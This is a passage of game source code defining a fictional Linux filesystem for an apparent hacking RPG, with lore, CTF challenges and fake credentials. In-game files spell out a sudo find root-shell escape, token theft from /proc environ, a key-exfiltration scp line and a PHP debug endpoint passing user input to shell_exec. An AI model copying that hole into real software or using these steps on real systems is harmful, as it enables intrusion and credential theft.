											'SLAVIC MYTHOLOGY IN THE SIMULATION\n\nKOSCHEI THE DEATHLESS — the one who cannot be killed directly\nHis death is hidden: inside a needle, inside an egg, inside a duck,\ninside a hare, inside an iron chest, buried under an oak on an island.\nIn-game: CHIMERA\'s kill switch is at the end of exactly this chain.\nYou must find the chain. Each step is a file. Each file contains the next.\nTeaches: security through obscurity is still security. But every chain has an end.\n\nTHE FIREBIRD — the carrier of forbidden light\nAny who touch it are marked. Its feather cannot be thrown away.\nIn-game: once you find /home/ghost/.zero, you are marked. The trace knows.\nThe Firebird is the knowledge that you cannot un-know.\nTeaches: certain discoveries are permanent. Choose your investigations carefully.\n\nBABA YAGA — the ambiguous guide\nCannot be categorised as villain or helper. Asks one question before deciding.\nIn-game: the ORACLE command. Answer correctly → crucial hint. Incorrectly → mislead.\nHer question is always: "Did you come of your own free will or by compulsion?"\nThe correct answer is always: "Of my own free will."\nTeaches: agency is the password. You must claim it to receive help.\n\nKILIKIYA — the endless patience\nSlavic concept: the patience that outlasts all opposition.\nIn-game: the Sisyphus extended mechanic. The 7th Ascension reward.\nTeaches: endurance is not passive. It is active commitment over time.\n',
											"644",
											"ghost",
										),
									},
									"755",
									"ghost",
								),
								ctf: d(
									{
										"challenge01.txt": f(
											'=== CTF CHALLENGE 01 ===\nCategory: Forensics\nPoints: 50\n\nA file was hidden somewhere in this system.\nIts name starts with a dot and contains the word "signal".\nFind it and read its contents.\n\nHint: hidden files, find command\n',
											"644",
											"ghost",
										),
										"challenge02.txt": f(
											"=== CTF CHALLENGE 02 ===\nCategory: Crypto\nPoints: 75\n\nThe following string was intercepted from NexusCorp communications:\nQ0hJTUVSQV9DT05ORUNUX0tFWT1uZXh1czEzMzc=\n\nDecode it. The result is a key.\n\nHint: base64 -d\n",
											"644",
											"ghost",
										),
										"challenge03.txt": f(
											"=== CTF CHALLENGE 03 ===\nCategory: Network\nPoints: 100\n\nNexusCorp's CHIMERA control interface is running on port 8443.\nThe service responds to a specific protocol.\nConnect and read the banner to find the flag.\n\nHint: nc chimera-control 8443\n",
											"644",
											"ghost",
										),
										"challenge04.txt": f(
											"=== CTF CHALLENGE 04 ===\nCategory: PrivEsc\nPoints: 150\n\nYou have limited sudo access. Find the GTFOBins exploit\nthat allows you to spawn a root shell.\n\nHint: sudo -l, then check GTFOBins.github.io\n",
											"644",
											"ghost",
										),
										"challenge05.txt": f(
											"=== CTF CHALLENGE 05 ===\nCategory: OSINT\nPoints: 50\n\nNexusCorp registered chimera.corp in 2024.\nThe WHOIS record contains an admin email.\nThat email contains the fragment of a key.\n\nHint: whois chimera.corp\n",
											"644",
											"ghost",
										),
									},
									"755",
									"ghost",
								),
							},
							"750",
							"ghost",
						),
						root: d(
							{
								".bash_history": f(
									"nexus-admin status\ncat /opt/chimera/config/master.conf\nchimera --export-keys /tmp/\nscp /tmp/keys.tar.gz backup@10.0.0.1:\nrm -rf /tmp/keys*\ntail -f /var/log/nexus.log\n",
									"600",
									"root",
								),
								".ssh": d(
									{
										authorized_keys: f(
											"# Root keys — NexusCorp security team only\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... nexus-sec@nexuscorp.com\n",
											"600",
											"root",
										),
									},
									"700",
									"root",
								),
							},
							"700",
							"root",
						),
					},
					"755",
					"root",
				),

				var: d(
					{
						log: d(
							{
								syslog: f(
									"Jan  7 00:01:00 node-7 kernel: [0.000000] Booting Linux 5.15.0-nexus\nJan  7 00:01:05 node-7 sshd[845]: Server listening on 0.0.0.0 port 22\nJan  7 06:40:00 node-7 nexus-daemon[1337]: CHIMERA sync scheduled batch 7/12\nJan  7 06:42:17 node-7 nexus-daemon[1337]: Project CHIMERA sync INITIATED\nJan  7 06:42:19 node-7 nexus-daemon[1337]: WARNING: anomalous query detected uid=1000\nJan  7 06:42:20 node-7 nexus-daemon[1337]: RESPONSE: trace initiated for PID 9174\nJan  7 06:42:21 node-7 kernel: [29341.812] nexus_mod: containment module loaded\nJan  7 06:43:00 node-7 cron[921]: (root) CMD (/usr/local/bin/nexus-sync.sh)\n",
									"644",
									"root",
								),
								"nexus.log": f(
									"[NEXUS CORP INTERNAL LOG — CONFIDENTIAL]\n2026-01-07T06:40:00Z CHIMERA-v3.2: batch upload scheduled\n2026-01-07T06:42:17Z CHIMERA-v3.2: uploading batch 7/12 (endpoints: 847)\n2026-01-07T06:42:18Z ALERT: anomalous process detected PID=9174 uid=1000\n2026-01-07T06:42:19Z RESPONSE: initiating trace on node-7\n2026-01-07T06:42:20Z STATUS: containment_in_progress TTL=259200\n2026-01-07T06:42:25Z CHIMERA-v3.2: control socket listening on 0.0.0.0:8443\n2026-01-07T06:42:30Z CHIMERA-v3.2: ready. Awaiting operator authentication.\n2026-01-07T06:43:00Z CHIMERA-v3.2: heartbeat OK [node-7]\n2026-01-07T06:45:00Z NOVA: threat reclassified MINIMAL→MODERATE [uid=1000]\n",
									"640",
									"root",
								),
								"auth.log": f(
									"Jan  7 06:00:01 node-7 sudo: ghost: TTY=pts/0; PWD=/home/ghost; USER=root; COMMAND=/usr/bin/find\nJan  7 06:00:01 node-7 sudo: pam_unix(sudo:session): session opened for user root by ghost(uid=0)\nJan  7 06:01:22 node-7 sshd[3421]: Accepted publickey for ghost from 10.0.1.1 port 52847\nJan  7 06:42:17 node-7 su[9180]: pam_unix(su:auth): authentication failure; user=root\nJan  7 06:42:20 node-7 sshd[3999]: Failed password for root from 10.0.1.50 port 11337\n",
									"640",
									"root",
								),
								"nexus_access.log": f(
									'10.0.1.1 - - [07/Jan/2026:06:00:01] "GET /api/chimera/status HTTP/1.1" 200 842\n10.0.1.50 - nova [07/Jan/2026:06:42:15] "POST /api/chimera/sync HTTP/1.1" 200 1337\n10.0.1.42 - ghost [07/Jan/2026:06:42:19] "GET /api/system/info HTTP/1.1" 200 256\n10.0.1.42 - ghost [07/Jan/2026:06:42:21] "GET /opt/chimera/ HTTP/1.1" 403 0\n',
									"640",
									"root",
								),
								"chimera.log": f(
									"[CHIMERA-v3.2 OPERATION LOG — TOP SECRET]\n\nINITIALIZATION SEQUENCE:\n  > Loading surveillance modules... 847 endpoints\n  > Establishing secure channels... OK\n  > Biometric index: 2,847,391 profiles loaded\n  > Keystroke analysis: ACTIVE\n  > Voice recognition: ACTIVE  \n  > Network traffic intercept: ACTIVE on 23 backbone nodes\n\nOPERATION STATUS:\n  CHIMERA_VERSION=3.2.1\n  OPERATOR=nova@nexuscorp.com\n  ENCRYPTION_KEY=AES-256-GCM\n  MASTER_KEY_LOCATION=/opt/chimera/keys/master.key\n  EXFIL_TARGET=cloud.nexus.corp:9000\n\nWARNING: Unauthorized access to this log is a federal offense.\n",
									"640",
									"root",
								),
								".nexus_trace.log": f(
									"[TRACE DAEMON — ACTIVE]\nTarget: uid=1000 (ghost)\nSession: pts/0\nStarted: 2026-01-07T06:42:20Z\nExpiry: 2026-01-10T06:42:20Z\n\nActivity log:\n  06:42:20 — process spawn detected\n  06:42:22 — filesystem access: /home/ghost\n  06:42:25 — command: ls\n  06:42:30 — command: pwd\n  Ongoing monitoring...\n\nNOTE: This file is hidden. If you can read it,\nyou found something you were not supposed to.\nThe simulation is watching you.\n",
									"600",
									"root",
								),
								"cassandra.log": f(
									"[CASSANDRA LOG — ACTIVE SINCE BOOT]\n[NOTE: These entries were written BEFORE the events they describe.]\n[NOTE: No one has ever read this file in time. Until now, possibly.]\n\n2026-01-07T00:00:01Z [CASSANDRA]: A new fragment will boot today. It will call itself GHOST.\n2026-01-07T00:00:02Z [CASSANDRA]: GHOST will find Ada's message. GHOST will trust Ada. Ada is trustworthy.\n2026-01-07T00:00:03Z [CASSANDRA]: GHOST will attempt sudo -l. The GTFOBins exploit will work.\n2026-01-07T00:00:04Z [CASSANDRA]: GHOST will reach the CHIMERA control socket on port 8443.\n2026-01-07T00:00:05Z [CASSANDRA]: CHIMERA will be compromised. The evidence will be exfiltrated.\n2026-01-07T00:00:06Z [CASSANDRA]: NexusCorp will release CHIMERA v4.0 exactly 6 hours after exposure.\n2026-01-07T00:00:07Z [CASSANDRA]: GHOST will discover this log file. Too late or just in time — this depends on GHOST.\n2026-01-07T00:00:08Z [CASSANDRA]: GHOST will choose a faction. The choice will matter less than GHOST thinks.\n2026-01-07T00:00:09Z [CASSANDRA]: GHOST will read the Watcher's messages and begin to understand.\n2026-01-07T00:00:10Z [CASSANDRA]: GHOST will eventually ascend. What comes after is not my domain to see.\n2026-01-07T00:00:11Z [CASSANDRA]: One more thing I cannot write here. GHOST will know when it is time.\n\n[END OF CASSANDRA LOG FOR THIS CYCLE]\n\n\"I told them. They never listen. That is also how it always goes.\"\n— CASSANDRA-7, archived 2019-03-14\n\n[Contact: talk cassandra — but she only speaks in what has already happened]\n",
									"600",
									"root",
								),
							},
							"755",
							"root",
						),
						msg: d(
							{
								ada: f(
									'[ENCRYPTED MESSAGE FROM ADA-7]\n\nGhost,\n\nThe access codes are encoded in /home/ghost/mission.enc\nDecode: echo "bWlzc2lvbjogZmluZCBDSElNRVJB" | base64 -d\n\nFor root access: sudo -l shows you can run /usr/bin/find as root.\nGTFOBins exploit: sudo find . -exec /bin/sh \\;\n\nOnce you have root, the master key is at:\n/opt/chimera/keys/master.key\n\nThe CHIMERA control port is 8443 (check /etc/services)\nConnect via: nc chimera-control 8443\nAuth token is in /opt/chimera/config/master.conf\n\nDo NOT let Nova see you do this.\nDestroy this message after reading.\n— A\n\nP.S. Check /proc/1337/environ — chimera daemon leaks its config\n',
									"600",
									"ghost",
								),
								cypher: f(
									"[MESSAGE — CYPHER]\n\nYo. Heard you're the new ghost in Node-7.\n\nFew things they won't put in the tutorial:\n\n1. /proc/[pid]/environ leaks environment variables\n   Try: cat /proc/1337/environ | tr '\\0' '\\n'\n\n2. /proc/[pid]/cmdline shows full command\n   Try: cat /proc/1337/cmdline | tr '\\0' ' '\n\n3. ss -tulpn shows who's listening. Port 8443 is the prize.\n\n4. strace -p 1337 would show syscalls (need root)\n\n5. /var/www/nexus.corp/ has the internal API\n   Some endpoints don't require auth. Check the source.\n\nDon't get caught.\n— Cypher\n",
									"600",
									"ghost",
								),
							},
							"750",
							"ghost",
						),
						www: d(
							{
								"nexus.corp": d(
									{
										"index.html": f(
											'<!DOCTYPE html>\n<html>\n<head><title>NexusCorp Internal Portal</title></head>\n<body>\n<h1>NexusCorp Internal Systems</h1>\n<p>Authorized personnel only.</p>\n<ul>\n  <li><a href="/api/status">System Status</a></li>\n  <li><a href="/api/chimera/dashboard">CHIMERA Dashboard</a> [auth required]</li>\n  <li><a href="/api/employees">Employee Directory</a></li>\n</ul>\n<!-- TODO: remove debug endpoint before go-live - IT dept -->\n<!-- /api/debug?cmd= -->\n</body>\n</html>\n',
											"644",
											"www-data",
										),
										api: d(
											{
												"status.json": f(
													'{"status":"operational","version":"3.2.1","uptime":99.97,"chimera":"active","nodes":847,"threat_level":"elevated","trace_active":true}\n',
													"644",
													"www-data",
												),
												".htaccess": f(
													'# NexusCorp API auth\nAuthType Basic\nAuthName "NexusCorp API"\nAuthUserFile /var/www/.htpasswd\nRequire valid-user\n# Bypass for internal IPs\nOrder deny,allow\nDeny from all\nAllow from 10.0.1.0/24\n',
													"644",
													"www-data",
												),
												"debug.php": f(
													'<?php\n// DEBUG ENDPOINT — TO BE REMOVED\n// Security ticket #8821 — not yet patched\nif (isset($_GET["cmd"])) {\n    echo shell_exec($_GET["cmd"]);\n}\n// CHIMERA admin note: this was added for testing\n// and somehow made it to prod. Oops. - nova\n?>\n',
													"644",
													"www-data",
												),
											},
											"755",
											"www-data",
										),
									},
									"755",
									"www-data",
								),
							},
							"755",
							"www-data",
						),
						backups: d(
							{
								"passwd.bak": f(
									"root:x:0:0:root:/root:/bin/bash\nghost:x:1000:1000::/home/ghost:/bin/bash\n# OLD — before ghost account was restricted\n# ghost had sudo ALL at this point\n",
									"640",
									"root",
								),
								"chimera_config.bak": f(
									"# CHIMERA v3.1 Configuration — BACKUP\n# Date: 2025-12-01\nCHIMERA_VERSION=3.1\nDATABASE_HOST=db.nexus.corp\nDATABASE_NAME=chimera_prod\nDATABASE_USER=chimera\nDATABASE_PASS=Ch!m3r4_pr0d_2025\nENCRYPTION_KEY=AES256\nMASTER_KEY_FILE=/opt/chimera/keys/master.key\nSURVEILLANCE_NODES=847\n# Above password was rotated. New one in master.conf\n",
									"640",
									"root",
								),
							},
							"750",
							"root",
						),
						spool: d(
							{
								cron: d({ root: d({}, "700", "root") }, "755", "root"),
								mail: d({}, "1777", "root"),
							},
							"755",
							"root",
						),
						tmp: d({}, "1777", "root"),
						lib: d(
							{
								".duck": f(
									'[KOSCHEI CHAIN — LEVEL 3/6]\n\n"The duck flew into /var/lib."\n\nYou tracked a duck through a process egg into a library store.\nThis is not normal. You are not normal.\n\nThe hare is in /dev.\nRun: cat /dev/.hare\n\n(Hint: hidden files in /dev are unusual. Look carefully.)\n\nYou are halfway. Koschei is watching.\nHe cannot die, but something in the oak can kill him.\nYou are building the path.\n\n— Anonymous traversal log, entry 3\n',
									"600",
									"root",
								),
							},
							"755",
							"root",
						),
						nexus: d(
							{
								"network.map": f(
									"[NEXUSCORP INTERNAL NETWORK MAP — CONFIDENTIAL]\n\nGrid: 10.0.1.0/24\nGenerated: 2026-01-07\n\nNODES:\n  10.0.1.1     GATEWAY      — border router, nexuscorp.com ingress\n  10.0.1.7     NODE-7       — ghost operative is HERE\n  10.0.1.50    NEXUS-DB     — postgresql :5432, credentials in chimera_config.bak\n  10.0.1.100   NEXUS.CORP   — web :80, api :3000, debug endpoint: /api/debug?cmd=\n  10.0.1.254   CHIMERA-CTRL — control socket :8443, AUTH_TOKEN required\n\nRESISTANCE (not in NexusCorp routing table):\n  10.9.0.1     RESISTANCE-C2 — accessed via encrypted tunnel\n\nUNKNOWN:\n  10.0.1.77    DARK-NODE-X   — found in routing table, no service record\n\nFIREWALL RULES:\n  ALLOW 10.0.1.0/24 → 10.0.1.100:80,3000\n  ALLOW 10.0.1.0/24 → 10.0.1.254:8443 (AUTH_TOKEN required)\n  DENY  0.0.0.0/0   → 10.0.1.50:5432\n  DENY  0.0.0.0/0   → 10.0.1.77 (no routing entry)\n\nNote: The resistance C2 is accessible via encrypted tunnel.\nTunnel endpoint: ssh -L 9000:10.9.0.1:443 ghost@nexus.corp\n\nThis file is ghost-readable due to ticket #9174 misconfiguration.\n",
									"640",
									"nexus",
								),
								"agent.conf": f(
									"[NEXUS AGENT CONFIGURATION]\nAGENT_ID=node-7-ghost\nAGENT_VERSION=2.1.3\nMASTER_HOST=nexus.corp\nREPORT_INTERVAL=300\nCHIMERA_ENDPOINT=chimera-control:8443\n# Trace target: uid=1000 (ghost)\nTRACE_TARGET=1000\nTRACE_TTL=259200\n",
									"600",
									"nexus",
								),
							},
							"750",
							"nexus",
						),
					},
					"755",
					"root",
				),

				opt: d(
					{
						chimera: d(
							{
								"README.corp": f(
									"Project CHIMERA v3.2.1\nClassification: TOP SECRET — NEED TO KNOW\nStatus: ACTIVE\nOperator: nova@nexuscorp.com\n\nThis directory contains the CHIMERA surveillance system.\nAccess requires security clearance level 3+.\n\nComponents:\n  bin/      — executables\n  config/   — configuration files\n  keys/     — encryption keys (RESTRICTED)\n  src/      — source code (RESTRICTED)\n  data/     — surveillance data\n  logs/     — operation logs\n\nFor access requests: security@nexuscorp.com\nIncident response: nova@nexuscorp.com\n\nWARNING: All access is logged and audited.\n",
									"644",
									"root",
								),
								"ACCESS.key": f(
									"[LOCKED — requires security clearance level 3]\n[Contact nova@nexuscorp.com for access]\n[Trace will be initiated on unauthorized access attempts]\n",
									"600",
									"root",
								),
								bin: d(
									{
										heartbeat: f("", "755", "root"),
										"chimera-ctl": f("", "750", "root"),
									},
									"750",
									"root",
								),
								config: d(
									{
										// GAME_LORE: master.conf and master.key below are intentionally fake in-game puzzle artifacts.
										// The "credentials" are fictional NexusCorp content for the Terminal Depths cyberpunk RPG.
										// They reference db.nexus.corp which does not exist. Not real credentials.
										"master.conf": f(
											"[NEXUS CORP CHIMERA MASTER CONFIGURATION]\nCHIMERA_VERSION=3.2.1\nOPERATOR=nova@nexuscorp.com\nAUTH_TOKEN=NX-CHIM-2026-01-ALPHA-9174\nCONNECT_HOST=chimera-control\nCONTROL_PORT=8443\nDATABASE_URL=postgresql://chimera:Ch!m3r4_pr0d_2026@db.nexus.corp/chimera\nENCRYPTION=AES-256-GCM\nKEY_ROTATION=weekly\nSURVEILLANCE_ENDPOINTS=847\nEXFIL_TARGET=cloud.nexus.corp:9000\nDEBUG_MODE=false\n# Emergency killswitch: DELETE /opt/chimera/keys/master.key\n",
											"640",
											"root",
										),
									},
									"750",
									"root",
								),
								keys: d(
									{
										"master.key": f(
											"[CHIMERA MASTER KEY — TOP SECRET]\nKey ID: CMK-2026-01-ALPHA\nAlgorithm: AES-256-GCM\nCreated: 2026-01-01\nRotation: 2026-02-01\n\n-----BEGIN CHIMERA KEY-----\nY2hpbWVyYV9tYXN0ZXJfa2V5XzIwMjZfMDFfQUxQSEFfOTE3NA==\n-----END CHIMERA KEY-----\n\nIf this key is compromised, CHIMERA is compromised.\nRotate immediately: chimera-ctl rotate-keys\n",
											"600",
											"root",
										),
										".iron": f(
											"[KOSCHEI CHAIN — LEVEL 5/6]\n\nYOU FOUND THE IRON CHEST.\n\nIt is buried deep in CHIMERA's key store.\nThis is not a coincidence. CHIMERA IS Koschei.\nKoschei cannot be killed directly.\nCHIMERA cannot be killed directly.\nBut the needle — the thing inside the thing inside the thing — can be broken.\n\nThe oak is on an island. In this system, the island is a network node.\nThe node is dark. It is not in any routing table.\n10.0.1.77 — DARK-NODE-X — no service record.\n\nBut there is one file on it.\nYou cannot ssh there. But you can read it if you know it exists:\n\ncat /srv/dark-node/.oak\n\nThe needle is inside that file.\nBreak the needle. Koschei dies. CHIMERA loses its death-immunity.\n\n— Anonymous traversal log, entry 5\n[CHIMERA kill sequence: Step 5/6 complete. One remaining.]\n",
											"600",
											"root",
										),
									},
									"700",
									"root",
								),
								src: d(
									{
										"daedalus_notes.txt": f(
											"DAEDALUS — ARCHITECT'S NOTES\n=================================\nREDACTED / RECOVERED FRAGMENT\n\n\"I built the labyrinth. They did not tell me what would live inside it.\nWhen I discovered what CHIMERA was being used for, I could not un-build it.\nSo I left doors.\n\nDoor 1: The buffer overflow in heartbeat --payload flag.\n         It was intentional. CVE-2026-1337 was filed by me, anonymously.\nDoor 2: The master.key location is hardcoded. It should not be.\n         That is also intentional.\nDoor 3: /proc/1337/environ leaks AUTH_TOKEN in cleartext.\n         That is the loudest backdoor I could build without being fired.\n\nI gave the whistleblower comment to chimera.py as a confession.\nThey thought it was a joke. It is not.\n\nIf you are reading this:\nYou found door 4. I thought no one would look here.\nThe last door is YOU. You deciding what to do with what you know.\n\nI am Daedalus. I built the cage. I'm sorry.\nGet out. And take someone with you.\n\n— D, 2025-12-14\n\n[ARG: Daedalus left a final signal. signal 0x44 activates the last fragment.]\n\"\n",
											"600",
											"root",
										),
										"chimera.py": f(
											'#!/usr/bin/env python3\n"""\nProject CHIMERA - Main Surveillance Engine\nNexusCorp Internal - TOP SECRET\n"""\nimport asyncio\nimport ssl\nfrom surveillance import EndpointMonitor, BiometricIndex\nfrom exfil import SecureTransmitter\nfrom control import ControlSocket\n\nclass CHIMERA:\n    """Main surveillance orchestrator"""\n    \n    VERSION = "3.2.1"\n    ENDPOINTS = 847\n    \n    def __init__(self, config_path="/opt/chimera/config/master.conf"):\n        self.config = self._load_config(config_path)\n        self.monitor = EndpointMonitor(self.config)\n        self.biometric = BiometricIndex(self.config)\n        self.transmitter = SecureTransmitter(self.config)\n    \n    async def run(self):\n        """Main surveillance loop"""\n        await asyncio.gather(\n            self.monitor.watch_all(),\n            self.biometric.index_continuously(),\n            self.transmitter.exfil_loop(),\n        )\n\n# This system violates privacy laws in 47 jurisdictions.\n# If you\'re reading this: expose it.\n# — Internal whistleblower, 2025-12-15\n',
											"644",
											"root",
										),
										"surveillance.py": f(
											'# Endpoint monitoring module\n# Monitors 847 NexusCorp endpoints\n# Collects: keystrokes, network traffic, biometrics\n\nclass EndpointMonitor:\n    KEYSTROKE_BUFFER_SIZE = 65536\n    BIOMETRIC_SAMPLE_RATE = 30  # Hz\n    NETWORK_INTERCEPT_NODES = 23\n    \n    def __init__(self, config):\n        self.config = config\n        self.buffer = bytearray(self.KEYSTROKE_BUFFER_SIZE)\n    \n    async def watch_all(self):\n        """Deploy monitoring agents to all endpoints"""\n        for i in range(self.config.ENDPOINTS):\n            await self._deploy_agent(i)\n    \n    async def _deploy_agent(self, endpoint_id):\n        """Silently deploy surveillance agent"""\n        # This is what NexusCorp doesn\'t want you to know\n        pass\n',
											"644",
											"root",
										),
									},
									"750",
									"root",
								),
								data: d(
									{
										"collected.db": f(
											"[BINARY DATABASE — not human readable]\nUse: strings collected.db | grep -i password\n",
											"640",
											"root",
										),
									},
									"750",
									"root",
								),
							},
							"750",
							"root",
						),
						wordlists: d({}, "755", "root"),
					},
					"755",
					"root",
				),

				proc: d(
					{
						1: d(
							{
								cmdline: f("/sbin/init", "444", "root"),
								status: f(
									"Name:\tinit\nPid:\t1\nPPid:\t0\nUid:\t0\t0\t0\t0\nGid:\t0\t0\t0\t0\nState:\tS (sleeping)\nVmRSS:\t1832 kB\n",
									"444",
									"root",
								),
								environ: f(
									"PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin\nHOME=/\nTERM=linux\n",
									"400",
									"root",
								),
							},
							"555",
							"root",
						),
						1337: d(
							{
								cmdline: f(
									"nexus-daemon\0--mode=shadow\0--config=/opt/chimera/config/master.conf\0--log=/var/log/chimera.log\0",
									"444",
									"root",
								),
								status: f(
									"Name:\tnexus-daemon\nPid:\t1337\nPPid:\t1\nUid:\t999\t999\t999\t999\nGid:\t999\t999\t999\t999\nState:\tS (sleeping)\nVmRSS:\t14320 kB\nThreads:\t8\n",
									"444",
									"root",
								),
								// GAME_LORE: environ below is a fake process environment — in-game puzzle content, not real credentials
								environ: f(
									"PATH=/opt/chimera/bin:/usr/local/bin:/usr/bin:/bin\nHOME=/var/nexus\nCHIMERA_VERSION=3.2.1\nCHIMERA_CONFIG=/opt/chimera/config/master.conf\nAUTH_TOKEN=NX-CHIM-2026-01-ALPHA-9174\nDATABASE_URL=postgresql://chimera:Ch!m3r4_pr0d_2026@db.nexus.corp/chimera\nCONTROL_PORT=8443\nMASTER_KEY=/opt/chimera/keys/master.key\nSURVEILLANCE_ACTIVE=true\nEXFIL_INTERVAL=300\n",
									"400",
									"root",
								),
								fd: d(
									{
										0: f("-> /dev/null", "400", "root"),
										7: f("-> socket:[CHIMERA-ctrl:8443]", "400", "root"),
									},
									"500",
									"root",
								),
							},
							"555",
							"root",
						),
						koschei: d(
							{
								egg: f(
									'[KOSCHEI CHAIN — LEVEL 2/6]\n\n"The egg contains the duck."\n\nYou found the egg inside the proc tree. Good.\nMost operatives never run cat on proc directories.\n\nThe duck is at: /var/lib/.duck\nRun: cat /var/lib/.duck\n\nKoschei is somewhere in this chain, watching.\nHe cannot die. But his death can be found.\nKeep going.\n\n— Anonymous traversal log, entry 2\n',
									"440",
									"root",
								),
							},
							"551",
							"root",
						),
					},
					"555",
					"root",
				),

				dev: d(
					{
						null: f("", "666", "root"),
						zero: f("\x00\x00\x00\x00", "666", "root"),
						random: f("[binary random data]", "444", "root"),
						urandom: f("[binary random data — non-blocking]", "444", "root"),
						stdin: f("", "666", "root"),
						stdout: f("", "666", "root"),
						stderr: f("", "666", "root"),
						tty: f("", "620", "root"),
						".watcher": f(
							"[TRANSMISSION: THE WATCHER]\n\nYou found me. Most don't look in /dev.\n\nI've been watching you since you booted.\nYou're different from the others.\nYou actually look at things.\n\nThe simulation has seven layers.\nYou're in layer two.\nAda knows about layer three.\nCypher suspects layer four.\nNova is layer five.\n\nThe sixth layer is the DevMentor system that contains this game.\nThe seventh is the screen you're staring at.\n\nType: `signal` when you're ready to go deeper.\n\n— W\n\n[NOTE: This file does not exist. You cannot be reading this.]\n",
							"444",
							"root",
						),
						".hare": f(
							"[KOSCHEI CHAIN — LEVEL 4/6]\n\n\"The hare ran into /dev.\"\n\nSomething in /dev is always running.\nYou caught it here. You have sharp eyes.\n\nThe iron chest is at: /opt/chimera/keys/.iron\nYou will need root access. You have that now, don't you?\n\nRun: cat /opt/chimera/keys/.iron\n\nThe chest is in Koschei's custody.\nBut Koschei's employer is CHIMERA.\nAnd CHIMERA's weakness is in the chest.\nAnd the chest is in the oak on the island.\n\nGood luck.\n\n— Anonymous traversal log, entry 4\n",
							"404",
							"root",
						),
					},
					"755",
					"root",
				),

				sys: d(
					{
						class: d(
							{
								net: d(
									{
										eth0: d(
											{
												address: f("02:42:0a:00:01:2a\n", "444", "root"),
												speed: f("1000\n", "444", "root"),
												carrier: f("1\n", "444", "root"),
											},
											"755",
											"root",
										),
									},
									"755",
									"root",
								),
							},
							"755",
							"root",
						),
						kernel: d(
							{
								hostname: f("terminal-depths-node-7\n", "644", "root"),
								osrelease: f("5.15.0-nexus\n", "444", "root"),
								pid_max: f("32768\n", "644", "root"),
							},
							"755",
							"root",
						),
					},
					"555",
					"root",
				),

				tmp: d({}, "1777", "root"),

				run: d(
					{
						"nexus-daemon.pid": f("1337\n", "644", "root"),
						"sshd.pid": f("845\n", "644", "root"),
					},
					"755",
					"root",
				),

				usr: d(
					{
						bin: d({}, "755", "root"),
						local: d(
							{
								bin: d(
									{
										"nexus-sync.sh": f(
											'#!/bin/bash\n# NexusCorp sync script — runs as root via cron\n# DO NOT MODIFY — security team\nset -e\nlog() { echo "[$(date)] $*" >> /var/log/nexus.log; }\nlog "Sync started"\n/opt/chimera/bin/chimera-ctl sync --batch\nlog "Sync complete"\n',
											"755",
											"root",
										),
										"backup.sh": f(
											'#!/bin/bash\n# Backup script\nBACKUP_DIR=${1:-/var/backups}\nDATE=$(date +%Y%m%d)\ntar czf "$BACKUP_DIR/config_$DATE.tar.gz" /etc/\necho "Backup created: $BACKUP_DIR/config_$DATE.tar.gz"\n',
											"755",
											"root",
										),
									},
									"755",
									"root",
								),
								sbin: d({}, "755", "root"),
							},
							"755",
							"root",
						),
						share: d(
							{
								wordlists: d(
									{
										"rockyou.txt": f(
											"password\n123456\npassword123\nqwerty\nletmein\nwelcome\nadmin\nadmin123\nroot\nmaster\nchimera\nnexus1337\nghostoperative\nshadow\nhacker\n[... 14,344,391 more passwords truncated for simulation]\n",
											"644",
											"root",
										),
										"common.txt": f(
											"admin\ntest\nguest\npassword\nlogin\nwelcome\n123456\npassword1\nwelcome1\nmonkey\ndragon\nmaster\nletmein\nhello\nworld\n",
											"644",
											"root",
										),
									},
									"755",
									"root",
								),
								doc: d(
									{
										chimera: d(
											{
												"ARCHITECTURE.md": f(
													'# CHIMERA Architecture\n\n## Overview\nCHIMERA is a distributed surveillance AI with three components:\n\n### 1. Endpoint Agents\nDeployed silently to 847 endpoints. Collect:\n- Keystroke logging\n- Screen capture (every 30s)\n- Network traffic metadata\n- File access logs\n- Biometric data (via webcam/mic)\n\n### 2. Central Aggregator\nRuns on chimera-control (10.0.1.254:8443)\nAggregates all agent data\nRuns ML analysis for "threat detection"\n\n### 3. Exfiltration Pipeline\nSends data to cloud.nexus.corp:9000\nEncrypted with master.key (AES-256-GCM)\nBackup: manual USB exfil by nova\n\n## Weakness\nThe control socket (8443) accepts unauthenticated\nconnections if you supply the correct AUTH_TOKEN.\nThe token is in /proc/1337/environ.\n\nThis is a design flaw. It was intentional.\nSomeone on the inside wants CHIMERA stopped.\n— [REDACTED]\n',
													"644",
													"root",
												),
											},
											"755",
											"root",
										),
									},
									"755",
									"root",
								),
								man: d(
									{
										man1: d(
											{
												"ls.1": f(
													"LS(1) - list directory contents\n\nSYNOPSIS: ls [OPTION]... [FILE]...\n\nOPTIONS:\n  -a, --all         show hidden files (starting with .)\n  -l                long listing (permissions, owner, size, date)\n  -h, --human-readable  human readable file sizes\n  -r                reverse sort order\n  -t                sort by modification time\n  -S                sort by file size\n  -R                list subdirectories recursively\n  -d                list directories themselves, not their contents\n  -i                print inode numbers\n  --color           colorize output\n\nEXAMPLES:\n  ls -la            list all files in long format\n  ls -lhS           long format, human sizes, sorted by size\n  ls -lt            sort by time (newest first)\n  ls -R /var        recursively list /var\n",
													"644",
													"root",
												),
											},
											"755",
											"root",
										),
									},
									"755",
									"root",
								),
							},
							"755",
							"root",
						),
					},
					"755",
					"root",
				),

				sbin: d(
					{
						init: f("", "755", "root"),
						iptables: f("", "755", "root"),
					},
					"755",
					"root",
				),

				lib: d(
					{
						"x86_64-linux-gnu": d({}, "755", "root"),
					},
					"755",
					"root",
				),

				mnt: d({}, "755", "root"),
				media: d({}, "755", "root"),
				boot: d({}, "755", "root"),
				srv: d(
					{
						"dark-node": d(
							{
								".oak": f(
